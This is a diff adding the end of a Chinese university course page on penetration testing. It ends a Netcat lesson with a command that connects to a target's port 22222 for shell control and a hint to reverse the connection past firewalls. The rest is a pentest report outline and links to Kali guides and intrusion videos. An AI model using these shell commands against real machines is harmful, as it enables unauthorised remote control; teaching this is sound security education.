+        <li>打开终端窗口与目标机22222端口建立连接，此时即可得到目标机的shell进行访问和控制        </li>
+        <div class="highlight">
+<pre><code class="hljs">root@kali:~# nc  目标机IP   22222
+</code></pre></div>
+    </ol>
+    <p>注意：在某些情况如外界不能连接到目标机时（如有防火墙），此时可设置为让目标机主动连接控制机（也即客户和服务器端互换），还可加入时间参数等。    </p>
+    <p><a href="../data/ns/nc.rar" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> 瑞士军刀 Netcat 下载
+    </a></p>
+</div>
+<h3 id="8-report">渗透测试报告</h3>
+<div class="bs-callout bs-callout-info">
+    <p>
+        对某系统或环境进行大量的渗透测试后，我们需记录或做出相应的评估，即渗透测试报告。一般格式如下：
+    <div class="highlight">
+<pre><code class="hljs">
+                                         XXX渗透测试报告
+
+    一、概述
+        1.1 渗透测试范围
+        1.2 渗透测试主要内容
+    二、脆弱性分析方法
+        2.1 工具自动分析
+    三、渗透测试过程描述
+        3.1 脆弱性分析综述
+        3.2 脆弱性分析统计
+        3.3 网站结构分析
+        3.4 目录遍历探测
+        3.5 隐藏文件探测
+        3.6 备份文件探测
+        3.7 CGI漏洞扫描
+        3.8 用户名和密码猜解
+        3.9 验证登陆漏洞
+        3.10 跨站脚本漏洞挖掘
+        3.10 SQL注射漏洞挖掘
+        3.11数据库挖掘分析
+    四、分析结果总结
+</code></pre></div>
+    </p>
+    <p><a href="../data/ns/渗透测试总结示例.rar" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> 渗透测试报告范例
+    </a></p>
+</div>
+
+</div>
+
+<!-- 相关资料
+    ================================================== -->
+<div class="bs-docs-section">
+    <div class="page-header">
+        <h1 id="9">相关资料和软件</h1>
+    </div>
+    <div class="bs-callout bs-callout-info">
+        <ol>
+            <p id="9-report">实验报告格式 <a href="../data/ns/sybg.doc" class="btn btn-warning">
+                <i class="glyphicon glyphicon-save"></i> 实验报告格式
+            </a></p>
+            <p >2014年5月，美国国防部声称其某些核心企业的机密被钓鱼了，FBI要通缉5名有名有姓的军人，E文好的看看这个
+                <a href="../data/ns/Mandiant_APT1_Report（61398部队）.pdf" class="btn btn-warning">
+                    <i class="glyphicon glyphicon-save"></i> Mandiant对61398部队的报告
+                </a> 再说。
+            </p>
+            <p id="9-kali">Kali Linux使用教程（英文pdf）<a href="../data/ns/Kali-Linux-Cookbook.pdf" class="btn btn-warning">
+                <i class="glyphicon glyphicon-save"></i> Kali-Linux-Cookbook
+            </a></p>
+            <p id="9-kali-web">用Kali进行Web渗透（英文pdf）<a
+                    href="../data/ns/Web%20Penetration%20Testing%20with%20Kali%20Linux%20(2).pdf" class="btn btn-warning">
+                <i class="glyphicon glyphicon-save"></i> Web Penetration Testing with Kali Linux
+            </a></p>
+            <p id="9-kali-web-cn">用Kali进行Web渗透（中文epub）<a
+                    href="../data/ns/Web渗透测试：使用Kali%20Linux中文版.epub" class="btn btn-warning">
+                <i class="glyphicon glyphicon-save"></i> Web渗透测试：使用Kali Linux中文版
+            </a></p>
+            <p id="9-kali-video">Kali/BT渗透视频（1.3G）<a
+                    href="../data/ns/video/BT5视频.rar" class="btn btn-warning">
+                <i class="glyphicon glyphicon-save"></i> Kali/BT渗透视频
+            </a></p>
+            <p id="9-anyue-video">暗月系列视频
+                <ol>
+                    <li><a href="../data/ns/video/暗月burpsuite1.5经典日站全过程.rar" class="btn btn-warning">
+                        <i class="glyphicon glyphicon-save"></i> 暗月burpsuite1.5经典日站全过程
+                    </a></li>
+                    <li><a href="../data/ns/video/暗月不雅裤快速导入处理教程.rar" class="btn btn-warning">
+                        <i class="glyphicon glyphicon-save"></i> 暗月不雅裤快速导入处理教程
+                    </a></li>
+                    <li> <a href="../data/ns/video/暗月一些教程.zip" class="btn btn-warning">
+                        <i class="glyphicon glyphicon-save"></i> 暗月一些教程
+                    </a></li>
+                    <li><a href="../data/ns/video/暗月原创提权视频.zip" class="btn btn-warning">
+                        <i class="glyphicon glyphicon-save"></i> 暗月原创提权视频
+                    </a></li>
+                    <li><a href="../data/ns/video/暗月原创网站入侵渗透视频(共三十一节上).zip" class="btn btn-warning">
+                        <i class="glyphicon glyphicon-save"></i> 暗月原创网站入侵渗透视频(共三十一节上)
+                    </a></li>
+                    <li><a href="../data/ns/video/暗月原创网站入侵渗透视频(共三十一节下).zip" class="btn btn-warning">
+                        <i class="glyphicon glyphicon-save"></i> 暗月原创网站入侵渗透视频(共三十一节下)
+                    </a></li>
+                </ol>
+            </p>
+            <p>
+                <a href="../data/ns/FreeGFW.zip"class="btn btn-success">
+                    <i class="glyphicon glyphicon-save"></i> AntiGFW软件工具包</a>
+            </p>
+        </ol>
+    </div>
+</div>
+
+
+</div>
+</div>
+
+</div>
+
+<!-- Footer
+================================================== -->
+<footer class="bs-footer" role="contentinfo">
+    <div class="container">
+        <p>本网站所列文档全部由棋歌整理及维护，并全部遵循 <a href="http://creativecommons.org/licenses/by/3.0/" target="_blank">CC BY 3.0</a>协议发布。
+        </p>
+
+        <p>Powered By <a href="http://nginx.org/" target="_blank" title="">Nginx</a> And<a
+                href="http://www.bootcss.com/"> Bootcss</a></p>
+
+        <p>
+            <a href="http://www.cqjtu.edu.cn/" target="_blank">重庆交通大学信息学院</a>
+        </p>
+    </div>
+</footer>
+
+<!-- JS and analytics only. -->
+<!-- Bootstrap core JavaScript
+================================================== -->
+<!-- Placed at the end of the document so the pages load faster -->
+<script src="../assets/js/jquery.js"></script>
+<script src="../assets/dist/js/bootstrap.min.js"></script>
+
+
+<script src="../docs-assets/js/holder.min.js"></script>
+<script src="../docs-assets/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="../docs-assets/js/application.js"></script>
+
+
+<!--<!-- Analytics-->
+<!--================================================== -->
+<!--<script type="text/javascript">-->
+<!--var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");-->
+<!--document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F3d8e7fc0de8a2a75f2ca3bfe128e6391' type='text/javascript'%3E%3C/script%3E"));-->
+<!--</script>-->
+
+
+</body>
+</html>
